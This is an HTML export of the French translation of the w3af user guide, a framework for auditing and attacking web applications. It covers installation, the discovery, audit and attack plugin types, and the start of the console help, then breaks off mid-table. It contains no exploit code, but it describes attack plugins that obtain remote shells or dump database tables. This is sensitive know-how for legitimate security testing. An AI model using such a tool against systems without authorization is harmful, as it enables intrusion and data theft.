<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="content-type" content="text/html; charset=utf-8" /><title> </title><meta name="generator" content="StarOffice/OpenOffice.org XSLT (http://xml.openoffice.org/sx2ml)" /><meta name="created" content="2007-05-14T16:45:42" /><meta name="changedby" content="dz0" /><meta name="changed" content="2009-11-19T07:26:27" /><base href="." /><style type="text/css">
	@page { size: 8.5inch 11inch; margin-top: 0.7874inch; margin-bottom: 0.7874inch; margin-left: 0.7874inch; margin-right: 0.7874inch }
	table { border-collapse:collapse; border-spacing:0; empty-cells:show }
	td, th { vertical-align:top; }
	h1, h2, h3, h4, h5, h6 { clear:both }
	ol, ul { padding:0; }
	* { margin:0; }
	*.fr1 { font-size:12pt; vertical-align:top; text-align:center; padding:0.0193in; border-width:0.049cm; border-style:solid; border-color:#000000; }
	*.Graphics { font-size:12pt; vertical-align:top; text-align:center; }
	*.Caption { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0.0835in; margin-bottom:0.0835in; font-style:italic; }
	*.Contents2 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-left:0.1965in; margin-right:0in; text-indent:0inch; }
	*.Contents3 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-left:0.3929in; margin-right:0in; text-indent:0inch; }
	*.ContentsHeading { font-family:'Bitstream Vera Sans'; font-size:16pt; margin-top:0.1665in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-weight:bold; }
	*.Heading { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; }
	*.Heading1 { font-family:'Bitstream Vera Sans'; font-size:24pt; margin-top:0.1665in; margin-bottom:0.0835in; font-weight:bold; }
	*.Heading2 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-style:italic; font-weight:bold; }
	*.Heading3 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-weight:bold; }
	*.Index { font-family:'Bitstream Vera Sans'; font-size:12pt; }
	*.List { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.P1 { font-family:'Bitstream Vera Sans'; font-size:16pt; margin-top:0.1665in; margin-bottom:0.0835in; text-align:center ! important; font-weight:bold; text-decoration:underline; }
	*.P10 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-style:normal; }
	*.P11 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; }
	*.P12 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-style:normal; }
	*.P13 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-style:normal; }
	*.P14 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-style:normal; font-weight:bold; }
	*.P15 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-style:normal; font-weight:normal; }
	*.P16 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-style:normal; font-weight:normal; }
	*.P17 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-style:normal; background-color:transparent; }
	*.P18 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-weight:normal; }
	*.P19 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-weight:normal; }
	*.P2 { font-family:'Bitstream Vera Sans'; font-size:10pt; text-align:center ! important; font-style:normal; font-weight:normal; }
	*.P20 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P21 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-weight:bold; }
	*.P22 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-weight:normal; }
	*.P23 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-style:normal; }
	*.P24 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-style:normal; }
	*.P25 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P26 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P27 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P28 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0in; margin-bottom:0.0835in; font-weight:bold; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P29 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0in; margin-bottom:0.0835in; font-weight:bold; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P3 { font-family:'Bitstream Vera Sans'; font-size:10pt; text-align:center ! important; font-style:normal; font-weight:bold; }
	*.P30 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-style:italic; font-weight:bold; margin-left:0in; margin-right:0in; text-indent:0inch; }
	*.P31 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-style:normal; font-weight:bold; margin-left:0in; margin-right:0in; text-indent:0inch; }
	*.P32 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-style:italic; font-weight:bold; margin-left:0in; margin-right:0in; text-indent:0inch; }
	*.P33 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-style:normal; font-weight:bold; margin-left:0in; margin-right:0in; text-indent:0inch; }
	*.P34 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; text-align:justify ! important; }
	*.P35 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; text-align:justify ! important; font-style:normal; }
	*.P36 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; font-weight:normal; }
	*.P37 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; text-align:justify ! important; }
	*.P38 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; text-align:justify ! important; font-weight:normal; }
	*.P39 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; }
	*.P4 { font-family:'Bitstream Vera Sans'; font-size:10pt; text-align:center ! important; font-style:italic; font-weight:bold; text-decoration:underline; }
	*.P40 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; font-style:normal; }
	*.P41 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; font-style:normal; font-weight:bold; }
	*.P42 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; font-style:normal; font-weight:normal; }
	*.P43 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; font-weight:bold; }
	*.P44 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-weight:bold; }
	*.P45 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; font-weight:normal; }
	*.P46 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-weight:normal; }
	*.P47 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; }
	*.P48 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P49 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P5 { font-family:'Bitstream Vera Sans'; font-size:12pt; text-align:center ! important; }
	*.P50 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-weight:bold; }
	*.P51 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0.1665in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; }
	*.P52 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0.1665in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P53 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:-0.9846in; margin-right:0in; text-indent:0inch; font-weight:normal; }
	*.P54 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; text-align:justify ! important; }
	*.P55 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0.1665in; margin-bottom:0.0835in; }
	*.P56 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0.1665in; margin-bottom:0.0835in; text-align:justify ! important; }
	*.P57 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-weight:bold; text-align:justify ! important; }
	*.P58 { font-family:'Bitstream Vera Sans'; font-size:10pt; text-align:center ! important; font-style:italic; font-weight:bold; text-decoration:underline; }
	*.P59 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-style:italic; font-weight:bold; }
	*.P6 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; }
	*.P60 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-style:italic; font-weight:bold; text-align:justify ! important; }
	*.P61 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-weight:bold; }
	*.P62 { font-family:'Bitstream Vera Sans'; font-size:14pt; margin-top:0.1665in; margin-bottom:0.0835in; font-style:italic; font-weight:bold; text-align:justify ! important; }
	*.P63 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-left:0.1965in; margin-right:0in; text-indent:0inch; }
	*.P64 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-left:0.3929in; margin-right:0in; text-indent:0inch; }
	*.P65 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.P66 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.P67 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; text-align:justify ! important; }
	*.P68 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; text-align:justify ! important; font-style:italic; }
	*.P69 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; }
	*.P7 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P70 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-style:normal; }
	*.P71 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-style:normal; font-weight:normal; }
	*.P72 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P73 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P74 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P75 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P76 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P77 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P78 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; }
	*.P79 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; }
	*.P8 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-align:justify ! important; text-indent:0inch; font-style:italic; }
	*.P80 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; }
	*.P81 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; font-weight:normal; }
	*.P82 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-indent:0inch; font-weight:normal; }
	*.P83 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P84 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P85 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P86 { font-family:'Nimbus Mono L'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0.4925in; margin-right:0in; text-align:justify ! important; text-indent:0inch; }
	*.P9 { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; margin-left:0in; margin-right:0in; text-indent:0inch; font-style:normal; }
	*.PreformattedText { font-family:'Bitstream Vera Sans Mono'; font-size:10pt; margin-top:0in; margin-bottom:0in; }
	*.Standard { font-family:'Bitstream Vera Sans'; font-size:12pt; }
	*.Textbody { font-family:'Bitstream Vera Sans'; font-size:12pt; margin-top:0in; margin-bottom:0.0835in; }
	*.Sect1 { }
	*.BulletSymbols { font-family:StarSymbol; font-size:9pt; }
	*.Internetlink { color:#000080; text-decoration:underline; }
	*.NumberingSymbols { }
	*.T1 { font-style:italic; }
	*.T2 { font-style:normal; }
	*.T3 { font-weight:bold; }
	*.T4 { font-family:'Nimbus Mono L'; }
	*.T5 { font-family:'Nimbus Mono L'; font-weight:normal; }
	*.T6 { font-family:'Bitstream Vera Sans'; }
	*.T7 { font-family:'Bitstream Vera Sans'; font-weight:normal; }
	*.T8 { font-weight:normal; }
	*.T9 { }
	</style></head><body dir="ltr"><p class="P1"> </p><p class="P1"> </p><p class="P1"> </p><p class="P1"> </p><p class="P1"> </p><p class="P1">w3af Guide de l'Utilisateur </p><p class="P2"> </p><p class="P2"> </p><p class="P2">Version: <span class="T3">1.6.2</span></p><p class="P2">Auteur originel: <span class="T3">Andres Riancho</span></p><p class="P2"> </p><p class="P2"> </p><p class="P2">Relecteurs:  </p><p class="P3">Mike Harbison </p><p class="P3">Andy Bach </p><p class="P3"> </p><p class="P4"> </p><p class="P2">Traduction française: <span class="T3">Jérôme Athias</span></p><p class="P2">(<a href="http://www.ja-psi.fr/">www.ja-psi.fr</a>)</p><p class="P4"> </p><p class="P4"> </p><p class="P4"> </p><p class="P4"> </p><p class="P4"> </p><p class="P4"> </p><p class="P4"> </p><p class="P4"> </p><p class="P4"> </p><p class="P4">26 Décembre 2008 </p><p class="P3"> </p><p class="P3">Nous sommes en 2008, vous regardez trop votre écran, bonsoir. </p><p class="P58"> </p><p class="ContentsHeading">Table des Matières </p><table border="0" cellspacing="0" cellpadding="0" class="P63"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Introduction </td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P63"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Téléchargement</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P63"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Installation</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P64"><colgroup><col style="width: 6.5319in" /></colgroup><tr><td>Prérequis à l'installation</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P63"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Etapes w3af</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P63"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Exécuter w3af</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P63"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Exécuter w3af avec l'interface utilisateur GTK</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P64"><colgroup><col style="width: 6.5319in" /></colgroup><tr><td>Plugins</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P64"><colgroup><col style="width: 6.5319in" /></colgroup><tr><td>Configuration de Plugin</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P63"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Démarrer un scan</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P64"><colgroup><col style="width: 6.5319in" /></colgroup><tr><td>Une session complète</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P63"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Avertissement sur la découverte</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P64"><colgroup><col style="width: 6.5319in" /></colgroup><tr><td>Quand tout le reste échoue...</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P63"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Scripts w3af</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P63"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>La sortie</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P63"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Sites complexes</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P63"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Exploitation</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P64"><colgroup><col style="width: 6.5319in" /></colgroup><tr><td>Techniques d'exploitation avancées</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P64"><colgroup><col style="width: 6.5319in" /></colgroup><tr><td>Virtual daemon</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P64"><colgroup><col style="width: 6.5319in" /></colgroup><tr><td>w3afAgent</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P63"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Plus d'informations</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P63"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Bogues</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P63"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Contributeurs</td></tr></table><table border="0" cellspacing="0" cellpadding="0" class="P63"><colgroup><col style="width: 6.7283in" /></colgroup><tr><td>Le mot de la fin</td></tr></table><p class="P5"> </p><h2 class="P59"><a name="Introduction" />Introduction </h2><p class="P34">Ce document est un guide utilisateur pour le Framework d'Attaque et d'Audit d'Application Web ( w3af ), son but est de fournir une vue d'ensemble basique de ce qu'est ce framework, comment il fonctionne et ce que vous pouvez en faire. </p><p class="P34"> </p><p class="P34">W3af est un environnement complet pour auditer et attaquer des applications web. Cet environnement fournit une plateforme solide pour des audits et tests d'intrusion. </p><h2 class="Heading2"><a name="T_C3_A9l_C3_A9chargement" />Téléchargement</h2><p class="P55">Le framework peut être téléchargé depuis la page principale du projet: </p><p class="P51"><a href="http://w3af.sf.net/#download">http://w3af.sf.net/#download</a></p><p class="P56">Il existe deux manières d'installer w3af: à partir d'un paquetage (setup de w3af pour Windows et paquetage tgz pour les systèmes basés sur unix), ou bien depuis SVN. Lors de la première utilisation; les utilisateurs devraient utiliser le dernier paquetage, alors que les utilisateurs plus avancés devraient réaliser un checkout SVN pour obtenir la dernière version du framework. </p><h2 class="Heading2"><a name="Installation" />Installation</h2><p class="P24">Le framework peut fonctionner sur toutes les plateformes supportées par Python, et w3af a été testé sur GNU/Linux, Windows XP, Windows Vista et OpenBSD. Ce guide utilisateur va vous guider à travers l'installation sur une plateforme GNU/Linux, l'installation sur une plateforme Windows étant triviale via l'installateur qui peut être obtenu sur le site officiel de w3af. </p><h3 class="P57"><a name="Pr_C3_A9requis__C3_A0_l_27installation" />Prérequis à l'installation</h3><p class="P6">Les paquetages requis pour exécuter w3af peuvent être divisés en deux groupes: </p><ul style="margin-left:1.25cm;"><li class="P69" style="margin-left:0cm;"><p class="P69" style="margin-left:0.25cm;">Prérequis principaux (Core): </p></li></ul><ul style="margin-left:0.5cm;"><li class="P78" style="margin-left:1.25cm;"><p class="P78" style="margin-left:0.25cm;">fpconst-0.7.2 </p></li><li class="P78" style="margin-left:1.25cm;"><p class="P78" style="margin-left:0.25cm;">pygoogle </p></li><li class="P78" style="margin-left:1.25cm;"><p class="P78" style="margin-left:0.25cm;">nltk </p></li><li class="P78" style="margin-left:1.25cm;"><p class="P78" style="margin-left:0.25cm;">SOAPpy </p></li><li class="P78" style="margin-left:1.25cm;"><p class="P78" style="margin-left:0.25cm;">pyPdf </p></li><li class="P78" style="margin-left:1.25cm;"><p class="P78" style="margin-left:0.25cm;">Beautiful Soup </p></li><li class="P78" style="margin-left:1.25cm;"><p class="P78" style="margin-left:0.25cm;">Python OpenSSL </p></li><li class="P78" style="margin-left:1.25cm;"><p class="P78" style="margin-left:0.25cm;">json.py </p></li><li class="P78" style="margin-left:1.25cm;"><p class="P78" style="margin-left:0.25cm;">scapy</p><p class="P78" style="margin-left:0.25cm;"> </p></li></ul><ul style="margin-left:1.25cm;"><li class="P69" style="margin-left:0cm;"><p class="P69" style="margin-left:0.25cm;">Prérequis pour l'interface graphique (GUI): </p></li></ul><ul style="margin-left:0.5cm;"><li class="P79" style="margin-left:1.25cm;"><p class="P79" style="margin-left:0.25cm;">python sqlite3 </p></li><li class="P79" style="margin-left:1.25cm;"><p class="P79" style="margin-left:0.25cm;">pyparsing </p></li><li class="P79" style="margin-left:1.25cm;"><p class="P79" style="margin-left:0.25cm;">pydot </p></li><li class="P79" style="margin-left:1.25cm;"><p class="P79" style="margin-left:0.25cm;">graphviz </p></li></ul><ul style="margin-left:0.5cm;"><li class="P78" style="margin-left:1.25cm;"><p class="P78" style="margin-left:0.25cm;">pygtk 2.0 </p></li><li class="P78" style="margin-left:1.25cm;"><p class="P78" style="margin-left:0.25cm;">gtk 2.12 </p></li></ul><ul style="margin-left:0.5cm;"><li class="P79" style="margin-left:1.25cm;"><p class="P79" style="margin-left:0.25cm;"> </p></li></ul><p class="P7">Comme vous avez pu le remarquer; les prérequis principaux sont nécessaires pour exécuter w3af avec n'importequelle interface utilisateur (console ou graphique), et les prérequis de l'interface graphique utilisateur sont nécessaires si vous souhaitez utiliser l'interface utilisateur GTK+. </p><p class="P7">Certains des prérequis sont inclus dans le paquetage, afin de rendre le processus d'installation plus simple pour les utilisateurs non expérimentés. Les prérequis embarqués se trouvent dans le répertoire <span class="T1">extlib</span>. La plus part des bibliothèques peuvent être lancées depusi ce répertoire, mais certaines autres nécesitent une installation, dont voici le processus (en tant que root):</p><p class="P39">cd w3af </p><p class="P39">cd fpconst-0.7.2 </p><p class="P39">python setup.py install </p><p class="P39">cd .. </p><p class="P39">cd pygoogle </p><p class="P39">python setup.py install </p><p class="P39">cd .. </p><p class="P39">cd nltk </p><p class="P39">python setup.py install </p><p class="P39">cd .. </p><p class="P39">cd SOAPpy </p><p class="P39">python setup.py install </p><p class="P39">cd .. </p><p class="P39">cd pyPdf </p><p class="P39">python setup.py install </p><p class="P6"> </p><p class="P6"> </p><p class="P7" /><h2 class="P30"><a name="Etapes_w3af" />Etapes w3af</h2><p class="P6"> </p><p class="P7">Avant même de lancer w3af, un utilisateur doit savoir comment l'applicatif est divisé et comment les plugins seront exécutés. Basiquement, w3af possède trois types de plugins: </p><p class="P7">découverte, audit et attaque. </p><p class="P7"><span class="T1">Les plugins découvertes</span> (<span class="T1">discovery plugins</span>) ont une unique utilité; trouver de nouvelles URLs, formulaires et autres “points d'injectioné. Un exemple classique de plugin découverte est l'explorateur web (web spider). Ce plugin attend une URL en entrée et retourne un ou plusieurs points d'injection. Quand un utilisateur active plus d'un plugin de ce type, ils fonctionnent dans une boucle: si le plugin A trouve une nouvelle URL au premier tour, le moteur w3af enverra cette URL au plugin B. Si le plugin B trouve ensuite une nouvelle URL; elle sera envoyée au plugin A. Ce processus continuera jusqu'à ce que tous les plugins soient lancés et qu'aucune autre information sur l'application cible ne puisse être découverte via les plugins découverte activés.</p><p class="P7"><span class="T1">Les plugins audit</span> attendent les points d'injection découverts par les plugins découverte et envoient des données construites spécifiquement à tous ces derniers afin de trouver des vulnérabilités. Un exemple classique de plugin audit en est un qui recherche des vulnérabilités d'injection SQL.</p><p class="P8">Les plugins attaque<span class="T2"> ont pour but d'exploiter les vulnérabilités trouvées par les plugins audit. Ils retournent en général un shell sur le serveur distant, ou un dump des tables distantes dans le cas des exploits d'injections SQL.</span></p><p class="P9"> </p><h2 class="P33"><a name="Ex_C3_A9cuter_w3af" />Exécuter w3af</h2><p class="P9"> </p><p class="P10">w3af a deux interfaces utilisateur; la console (consoleUI) et l'interface graphique (gtkUi). Ce guide utilisateur va se concentrer sur consoleUI, qui est actuellement mieux testée et plus complète que gtkUi. </p><p class="P10">Pour lancer consoleUI, vous avez simplement à exécuter w3af sans paramètres et vous obtiendrez un prompt comem celui-ci: </p><p class="P40"><span class="T3">$</span> ./w3af_console</p><p class="P41">w3af&gt;&gt;&gt; </p><p class="P40"> </p><p class="P13">A partir de ce prompt, vous pourrez configurer le framework, lancer des scans et plus loin exploiter une vulnérabilité. A ce niveau, vous pouvez débuter par tapper des commandes, la première à apprendre étant “help” (Notez que les commandes sont sensibles à la casse): </p><p class="P12"> </p><p class="P40"><span class="T3">w3af&gt;&gt;&gt;</span> help</p><p class="P40">|------------------------------------------------------|  </p><p class="P40">| start         | Start the scan.                      | </p><p class="P40">| plugins       | Enable and configure plugins.        | </p><p class="P40">| exploit       | Exploit the vulnerability.           | </p><p class="P40">| profiles      | List and use scan profiles.          | </p><p class="P40">|------------------------------------------------------|  </p><p class="P40">| http-settings | Configure the http settings of the   |</p><p class="P40">|               | framework.                           | </p><p class="P40">| misc-settings | Configure w3af misc settings.        | </p><p class="P40">| target        | Configure the target URL.            | </p><p class="P40">|------------------------------------------------------|  </p><p class="P40">| back          | Go to the previous menu.             | 